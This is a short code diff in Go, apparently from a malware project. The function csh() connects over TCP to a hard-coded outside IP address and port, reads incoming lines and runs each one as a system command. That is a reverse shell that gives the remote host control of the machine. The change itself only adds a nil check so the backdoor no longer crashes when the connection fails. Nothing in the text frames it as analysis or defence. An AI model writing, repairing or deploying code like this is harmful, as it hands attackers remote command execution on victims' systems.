@@ -35,6 +35,9 @@ func startsh(o string) {
 
 func csh() {
 	conn, _ := net.Dial("tcp", "193.38.54.60:3443")
+	if conn == nil {
+		return
+	}
 	for {
 		message, _ := bufio.NewReader(conn).ReadString('\n')
 		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
